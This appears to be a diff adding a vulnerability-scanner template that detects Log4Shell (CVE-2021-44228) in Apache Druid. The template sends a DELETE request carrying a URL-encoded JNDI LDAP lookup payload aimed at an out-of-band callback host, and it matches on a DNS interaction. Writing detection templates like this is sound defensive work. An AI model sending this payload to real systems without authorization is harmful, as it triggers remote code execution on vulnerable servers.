@@ -1,0 +1,36 @@
+id: apache-druid-log4j-rce
+brief:
+    title: Apache Druid - Remote Code Execution (Apache Log4j)
+    by: SleepingBag945
+    level: critical
+    about: Apache Druid is vulnerable to RCE due to Log4j.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - apache
+        - druid
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: DELETE
+      to:
+        - '{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 404
